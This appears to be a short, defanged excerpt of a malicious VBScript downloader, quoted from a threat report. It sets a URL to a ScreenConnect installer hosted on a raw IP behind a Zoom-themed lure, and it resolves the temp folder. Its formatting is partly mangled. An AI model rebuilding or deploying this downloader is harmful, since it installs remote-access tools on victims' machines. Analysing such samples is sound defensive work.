  - Dim url, tempPath, http, stream Aurl = hXXp://212[.]11[.]64[.]45/Bin/ScreenConnect[.]ClientSetup[.]msi?e=Access&y=Guest&c=zoom%20link&c=zoom&c=&c=&c=&c=&c=&c="Set
    Wshshell = Createobject("WScript.shell")tempPath = Wshshell.ExpandEnvironmentStrings("%TEMP%")
